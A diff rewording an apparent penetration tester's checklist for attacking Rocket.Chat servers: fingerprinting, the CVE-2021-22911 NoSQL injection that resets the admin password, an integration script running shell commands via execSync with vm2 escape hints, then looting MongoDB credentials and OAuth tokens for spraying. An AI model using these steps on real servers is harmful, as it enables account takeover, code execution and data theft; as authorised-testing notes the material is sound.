@@ -1,29 +1,31 @@
 # Rocket.Chat
 
 ## Before I start
-- [ ] Port 3000; version: curl -s http://target:3000/api/info | jq .version
-- [ ] Registration open → account → read channels (creds, hostnames, runbooks in chat history)
+- [ ] Port 3000 by default
+curl -sk <Scheme>://<WebHost>/api/info | jq .version
+- [ ] Registration open: an account reads the channels, and the credentials, host names and runbooks in their history
 
-## CVE-2021-22911 (3.12/3.13 era, unauth)
-- [ ] NoSQLi in password reset → leak reset token char-by-char ($regex oracle): :Pb nosqli
-- [ ] searchsploit rocket.chat — PoCs automate the loop
-- [ ] Result: reset the ADMIN password → full workspace
+## CVE-2021-22911, with no login
+- [ ] Versions around 3.12 and 3.13: NoSQL injection in the password reset leaks the reset token one character at a time, through a $regex oracle: :Pb nosqli
+searchsploit rocket.chat
+- [ ] The public exploits run that loop, and end with the administrator's password reset
 
-## Admin → RCE (Integrations)
-- [ ] Administration → Integrations → New → Incoming → script section
+## Administrator to commands, through an integration
+- [ ] Administration, Integrations, New, Incoming, with this as the script:
 class Script { process_incoming_request({ request }) { return { content: { text: require('child_process').execSync('id').toString() } }; } }
-- [ ] Fire the webhook: curl -X POST http://target:3000/hooks/<token>/<id>
-- [ ] require blocked on hardened builds → old vm2 escapes (this.constructor.constructor)
-- [ ] Check version, then searchsploit: :Pb web-cves
+THE-WEBHOOK-URL is the address the integration shows once saved:
+curl -sk -X POST 'THE-WEBHOOK-URL'
+- [ ] require blocked on a hardened build: the old vm2 escapes, through this.constructor.constructor
+- [ ] The version, then searchsploit: :Pb web-cves
 
-## Post-foothold loot
-- [ ] MONGO_URL in service env → the whole workspace DB: :Pb mongodb
-- [ ] Users, messages, uploads, OAuth tokens all in Mongo
-- [ ] rocketchat user shell → :Pb linux-enum
+## After a shell
+- [ ] MONGO_URL in the service's environment opens the whole workspace database: :Pb mongodb
+- [ ] Users, messages, uploads and OAuth tokens are all in MongoDB
+- [ ] A shell as the rocketchat user: :Pb linux-enum
 
 ## If it fails
-- [ ] Patched + registration closed → chat is a cred source, not a door; look elsewhere first
+- [ ] Patched, and registration closed: a source of credentials later, not a way in
 
 ## Next
-- [ ] Chat loot = spray material: :Pb spraying
-- [ ] Mongo access → user-table manipulation, more creds
+- [ ] What the chat history gave: :Pb spraying
+- [ ] With MongoDB: the users collection changed, and more credentials
